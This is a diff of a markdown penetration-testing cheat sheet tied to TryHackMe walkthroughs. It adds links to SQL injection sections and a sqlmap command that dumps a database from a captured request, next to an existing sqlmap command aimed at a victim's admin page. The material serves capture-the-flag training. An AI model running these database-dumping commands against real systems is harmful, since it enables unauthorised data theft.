@@ -78,7 +78,7 @@ ls /SecLists/Discovery/Web-Content/common.txt
 
 **Examples**
 
-[madeyes-castle](../../walkthroughs/tryhackme/madeyes-castle/ "mention")
+[madeyes-castle](../../walkthroughs/tryhackme/madeyes-castle/ "mention")[#sql-injection](../../walkthroughs/tryhackme/wekor.md#sql-injection "mention")
 
 **Example List**
 
@@ -173,12 +173,15 @@ ls /SecLists/Discovery/Web-Content/common.txt
 
 **Examples**
 
-[#sql](../../walkthroughs/tryhackme/the-cod-caper.md#sql "mention")[#sql-injection](../../walkthroughs/tryhackme/gallery.md#sql-injection "mention")[expose.md](../../walkthroughs/tryhackme/expose.md "mention")
+[#sql](../../walkthroughs/tryhackme/the-cod-caper.md#sql "mention")[#sql-injection](../../walkthroughs/tryhackme/gallery.md#sql-injection "mention")[expose.md](../../walkthroughs/tryhackme/expose.md "mention")[#sqlmap](../../walkthroughs/tryhackme/olympus.md#sqlmap "mention")
 
 **Kali**
 
 ```
 sqlmap -u http://$VICTIM/administrator.php --forms --dump
+
+Capture request
+sqlmap -r req.txt --dbms=mysql --dump
 ```
 
 Get databases
